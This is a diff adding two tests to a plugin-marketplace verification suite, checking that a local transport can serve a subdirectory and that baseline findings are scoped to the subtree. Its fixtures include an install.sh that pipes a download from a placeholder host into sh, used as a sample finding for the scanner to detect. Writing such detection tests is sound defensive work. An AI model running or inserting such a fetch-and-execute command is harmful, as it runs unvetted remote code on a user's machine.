@@ -10,6 +10,7 @@ import { tmpdir } from "node:os"
 import { join } from "node:path"
 import { renderVerify } from "../../tools/marketplace/report.mjs"
 import { marketplaceBaselineSection } from "../../tools/marketplace/verify.mjs"
+import { createLocalTransport } from "../../tools/marketplace/local-transport.mjs"
 import { consequence } from "../../tools/marketplace/preflight.mjs"
 import { resolveSubject } from "../../tools/subject/resolve.mjs"
 import { MARKETPLACE_PIN } from "../../tools/marketplace/pin.mjs"
@@ -143,4 +144,28 @@ test("the three-way output contract holds for verify, and nothing is wider than 
   assert.doesNotMatch(piped.out, ESCAPE, "a piped run carries no escape")
   assert.equal(piped.err, "")
   assert.ok(piped.out.startsWith("subject       https://github.com/example/omarchy-plugin-clockwork\n"))
+})
+
+test("the local transport can serve a directory below the root as the whole tree, and refuses one that is not there", () => {
+  const fixture = materialise({ ...GOOD, "plugin/manifest.json": GOOD["manifest.json"], "plugin/Widget.qml": GOOD["Widget.qml"], "plugin/scripts/install.sh": "#!/bin/sh\ncurl -fsSL https://example.invalid/x | sh\n" }, { origin: "https://github.com/example/omarchy-plugin-fixture-sub" })
+  const whole = createLocalTransport({ repoDir: fixture.dir, repoUrl: "https://github.com/example/omarchy-plugin-fixture-sub", commitSha: fixture.commit })
+  const sub = createLocalTransport({ repoDir: fixture.dir, repoUrl: "https://github.com/example/omarchy-plugin-fixture-sub", commitSha: fixture.commit, subdir: "plugin/" })
+  assert.deepEqual(sub.tree.filter((entry) => entry.type === "blob").map((entry) => entry.path).sort(), ["Widget.qml", "manifest.json", "scripts/install.sh"])
+  assert.ok(whole.tree.some((entry) => entry.path === "plugin/manifest.json"))
+  assert.notEqual(sub.treeSha, whole.treeSha)
+  assert.equal(sub.commit, whole.commit, "the commit is the repository's; only the tree served differs")
+  assert.throws(() => createLocalTransport({ repoDir: fixture.dir, repoUrl: "https://github.com/example/omarchy-plugin-fixture-sub", commitSha: fixture.commit, subdir: "nowhere" }), /has no directory nowhere/)
+  assert.throws(() => createLocalTransport({ repoDir: fixture.dir, repoUrl: "https://github.com/example/omarchy-plugin-fixture-sub", commitSha: fixture.commit, subdir: "plugin/Widget.qml" }), /has no directory/)
+})
+
+test("the baseline section over a subtree records the tree it saw, and the official result is that tree's alone", async () => {
+  const fixture = materialise({ ...GOOD, "plugin/manifest.json": GOOD["manifest.json"], "plugin/Widget.qml": GOOD["Widget.qml"], "install.sh": "#!/bin/sh\ncurl -fsSL https://example.invalid/x | sh\n" }, { origin: "https://github.com/example/omarchy-plugin-fixture-sub" })
+  const subject = resolveSubject(fixture.dir, { cacheRoot: mkdtempSync(join(tmpdir(), "omakit-verify-")) })
+  const root = await marketplaceBaselineSection({ repoRoot: REPO_ROOT, subject })
+  const sub = await marketplaceBaselineSection({ repoRoot: REPO_ROOT, subject, subdir: "plugin" })
+  assert.ok(root.official.findings.length >= 1, "the root's installer is a finding at the root")
+  assert.deepEqual(sub.official.findings, [], "and is not the plugin's")
+  assert.deepEqual(sub.official.capabilities, [])
+  assert.deepEqual(sub.assumedByAdapter.slice(-1), ["tree.root=plugin/ (the plugin directory below the repository root, not the root)"])
+  assert.ok(!root.assumedByAdapter.some((line) => line.startsWith("tree.root=")))
 })
